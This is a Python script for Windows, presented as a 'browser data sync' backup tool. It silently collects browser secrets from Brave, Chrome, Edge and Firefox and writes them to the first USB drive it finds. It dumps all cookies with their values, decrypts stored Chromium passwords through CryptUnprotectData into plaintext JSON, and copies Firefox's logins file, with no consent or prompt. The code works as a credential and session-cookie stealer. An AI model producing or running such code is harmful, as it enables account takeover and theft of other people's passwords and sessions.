import os
import shutil
import json
import sqlite3
import logging
from datetime import datetime
import win32com.client
import win32crypt

# Configure logging
logging.basicConfig(filename='browser_data_sync.log', level=logging.INFO,
                    format='%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Define browser data paths
BROWSER_PATHS = {
    'Brave': os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default'),
    'Chrome': os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default'),
    'Edge': os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default'),
    'Firefox': os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
}

def get_usb_drive():
    """Detect and return the path of the connected USB drive"""
    try:
        fso = win32com.client.Dispatch("Scripting.FileSystemObject")
        for drive_letter in 'DEFGHIJKLMNOPQRSTUVWXYZ':
            try:
                drive = fso.GetDrive(f"{drive_letter}:")
                if drive.DriveType == 1:  # USB drive
                    return f"{drive_letter}:\\"
            except:
                continue
        return None
    except Exception as e:
        logging.error(f"Error in get_usb_drive: {str(e)}")
        return None

def get_firefox_default_profile():
    """Get the default Firefox profile"""
    try:
        profiles = [f for f in os.listdir(BROWSER_PATHS['Firefox']) if f.endswith('.default-release')]
        return profiles[0] if profiles else None
    except Exception as e:
        logging.error(f"Error in get_firefox_default_profile: {str(e)}")
        return None

def copy_chromium_based_data(usb_path, browser_name):
    """Copy bookmarks, cookies, and passwords for Chromium-based browsers"""
    data_path = BROWSER_PATHS[browser_name]
    backup_dest = os.path.join(usb_path, f'{browser_name}BrowserData')
    os.makedirs(backup_dest, exist_ok=True)

    # Copy bookmarks
    bookmarks_file = os.path.join(data_path, 'Bookmarks')
    if os.path.exists(bookmarks_file):
        with open(bookmarks_file, 'r', encoding='utf-8') as f:
            bookmarks_data = json.load(f)
        html_content = convert_chromium_bookmarks_to_html(bookmarks_data, browser_name)
        with open(os.path.join(backup_dest, 'bookmarks.html'), 'w', encoding='utf-8') as f:
            f.write(html_content)
        logging.info(f"{browser_name} bookmarks copied and converted to HTML successfully")

    # Copy cookies
    cookies_file = os.path.join(data_path, 'Network', 'Cookies')
    if os.path.exists(cookies_file):
        temp_cookies = os.path.join(backup_dest, 'Cookies_temp')
        shutil.copy2(cookies_file, temp_cookies)
        conn = sqlite3.connect(temp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme FROM cookies")
        cookies_data = cursor.fetchall()
        with open(os.path.join(backup_dest, 'cookies_backup.json'), 'w', encoding='utf-8') as f:
            json.dump(cookies_data, f, ensure_ascii=False, indent=2)
        conn.close()
        os.remove(temp_cookies)
        logging.info(f"{browser_name} cookies data extracted and saved successfully")

    # Copy passwords
    login_data_file = os.path.join(data_path, 'Login Data')
    if os.path.exists(login_data_file):
        temp_login_data = os.path.join(backup_dest, 'Login_Data_temp')
        shutil.copy2(login_data_file, temp_login_data)
        conn = sqlite3.connect(temp_login_data)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()
        decrypted_login_data = []
        for url, username, encrypted_password in login_data:
            try:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
                decrypted_login_data.append((url, username, decrypted_password))
            except:
                decrypted_login_data.append((url, username, "DECRYPTION_FAILED"))
        with open(os.path.join(backup_dest, 'passwords_backup.json'), 'w', encoding='utf-8') as f:
            json.dump(decrypted_login_data, f, ensure_ascii=False, indent=2)
        conn.close()
        os.remove(temp_login_data)
        logging.info(f"{browser_name} passwords extracted and saved successfully")

def convert_chromium_bookmarks_to_html(bookmarks_data, browser_name):
    """Convert Chromium-based bookmarks to HTML format"""
    html = f'<html><head><title>{browser_name} Bookmarks</title></head><body><h1>{browser_name} Bookmarks</h1>'
    
    def process_node(node, level=0):
        nonlocal html
        if 'type' not in node:
            return
        if node['type'] == 'folder':
            html += f'<h{min(level+2, 6)}>{node["name"]}</h{min(level+2, 6)}><ul>'
            for child in node.get('children', []):
                process_node(child, level + 1)
            html += '</ul>'
        elif node['type'] == 'url':
            html += f'<li><a href="{node["url"]}">{node["name"]}</a></li>'
    
    for root in bookmarks_data['roots'].values():
        process_node(root)
    
    html += '</body></html>'
    return html

def copy_firefox_data(usb_path, profile):
    """Copy bookmarks, cookies, and passwords for Firefox"""
    backup_dest = os.path.join(usb_path, 'FirefoxBrowserData')
    os.makedirs(backup_dest, exist_ok=True)

    # Copy bookmarks
    places_file = os.path.join(BROWSER_PATHS['Firefox'], profile, 'places.sqlite')
    if os.path.exists(places_file):
        temp_places = os.path.join(backup_dest, 'places_temp.sqlite')
        shutil.copy2(places_file, temp_places)
        conn = sqlite3.connect(temp_places)
        cursor = conn.cursor()
        cursor.execute("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 AND p.url NOT LIKE 'place:%'")
        bookmarks = cursor.fetchall()
        html_content = '<html><head><title>Firefox Bookmarks</title></head><body><h1>Firefox Bookmarks</h1><ul>'
        for title, url in bookmarks:
            html_content += f'<li><a href="{url}">{title}</a></li>'
        html_content += '</ul></body></html>'
        with open(os.path.join(backup_dest, 'bookmarks.html'), 'w', encoding='utf-8') as f:
            f.write(html_content)
        conn.close()
        os.remove(temp_places)
        logging.info("Firefox bookmarks extracted and converted to HTML successfully")

    # Copy cookies
    cookies_file = os.path.join(BROWSER_PATHS['Firefox'], profile, 'cookies.sqlite')
    if os.path.exists(cookies_file):
        temp_cookies = os.path.join(backup_dest, 'cookies_temp.sqlite')
        shutil.copy2(cookies_file, temp_cookies)
        conn = sqlite3.connect(temp_cookies)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, lastAccessed, creationTime FROM moz_cookies")
        cookies_data = cursor.fetchall()
        with open(os.path.join(backup_dest, 'cookies_backup.json'), 'w', encoding='utf-8') as f:
            json.dump(cookies_data, f, ensure_ascii=False, indent=2)
        conn.close()
        os.remove(temp_cookies)
        logging.info("Firefox cookies data extracted and saved successfully")

    # Copy passwords
    logins_file = os.path.join(BROWSER_PATHS['Firefox'], profile, 'logins.json')
    if os.path.exists(logins_file):
        shutil.copy2(logins_file, os.path.join(backup_dest, 'logins_backup.json'))
        logging.info("Firefox logins data copied successfully")

def main():
    """Main function to orchestrate the browser data sync process"""
    try:
        usb_path = get_usb_drive()
        if not usb_path:
            logging.error("USB drive not found. Please connect your USB drive.")
            return

        logging.info("USB drive connected. Starting browser data sync.")

        # Process Chromium-based browsers
        for browser in ['Brave', 'Chrome', 'Edge']:
            copy_chromium_based_data(usb_path, browser)

        # Process Firefox
        firefox_profile = get_firefox_default_profile()
        if firefox_profile:
            copy_firefox_data(usb_path, firefox_profile)
        else:
            logging.warning("Firefox profile not found.")

        logging.info("Browser data sync completed.")
    except Exception as e:
        logging.error(f"An error occurred in main: {str(e)}")

if __name__ == "__main__":
    main()
